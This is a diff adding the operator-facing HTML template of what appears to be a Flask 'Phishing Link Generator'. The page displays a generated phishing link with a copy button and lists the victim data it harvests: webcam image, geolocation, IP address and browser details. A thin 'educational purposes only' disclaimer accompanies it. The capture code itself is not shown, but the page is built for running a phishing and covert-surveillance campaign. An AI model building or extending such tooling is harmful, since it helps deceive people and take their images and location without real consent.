@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Generated Phishing Link</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <style>
+        .link-container {
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #f5f5f5;
+            border-radius: 5px;
+            word-wrap: break-word;
+        }
+        .copy-btn {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .disclaimer {
+            margin-top: 30px;
+            padding: 15px;
+            background-color: #ffe6e6;
+            border-left: 4px solid #ff6666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Phishing Link Generator</h1>
+        <p>Below is your generated phishing link for educational purposes:</p>
+        
+        <div class="link-container">
+            <p id="phishing-link">{{ link }}</p>
+            <button class="copy-btn" onclick="copyLink()">Copy Link</button>
+        </div>
+        
+        <p>When someone clicks this link and provides consent, you'll receive their:</p>
+        <ul>
+            <li>Webcam image</li>
+            <li>Geolocation data</li>
+            <li>IP address</li>
+            <li>Browser information</li>
+        </ul>
+        
+        <div class="disclaimer">
+            <h3>⚠️ Ethical Use Disclaimer</h3>
+            <p>This tool is for <strong>educational purposes only</strong>. Using this tool to collect data without explicit consent is:</p>
+            <ul>
+                <li>Potentially illegal in many jurisdictions</li>
+                <li>Unethical</li>
+                <li>A violation of privacy</li>
+            </ul>
+            <p>Always inform users about data collection and obtain proper consent.</p>
+        </div>
+        
+        <div style="margin-top: 20px;">
+            <a href="/admin" class="btn">Back to Admin</a>
+        </div>
+    </div>
+    
+    <script>
+        function copyLink() {
+            const linkText = document.getElementById('phishing-link').textContent;
+            navigator.clipboard.writeText(linkText)
+                .then(() => {
+                    alert('Link copied to clipboard!');
+                })
+                .catch(err => {
+                    console.error('Failed to copy: ', err);
+                    // Fallback for older browsers
+                    const textarea = document.createElement('textarea');
+                    textarea.value = linkText;
+                    document.body.appendChild(textarea);
+                    textarea.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(textarea);
+                    alert('Link copied to clipboard!');
+                });
+        }
+    </script>
+</body>
+</html>
